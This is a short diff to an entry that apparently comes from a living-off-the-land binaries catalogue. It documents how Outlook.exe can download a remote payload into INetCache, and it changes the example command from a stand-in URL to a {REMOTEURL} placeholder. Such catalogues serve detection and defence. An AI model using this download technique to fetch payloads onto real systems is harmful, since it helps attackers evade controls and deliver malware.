@@ -4,7 +4,7 @@ Description: Microsoft Office component
 Author: Nir Chako
 Created: 2022-11-08
 Commands:
-  - Command: Outlook.exe https://example.com/payload
+  - Command: Outlook.exe {REMOTEURL}
     Description: Downloads payload from remote server
     Usecase: It will download a remote payload and place it in INetCache.
     Category: Download
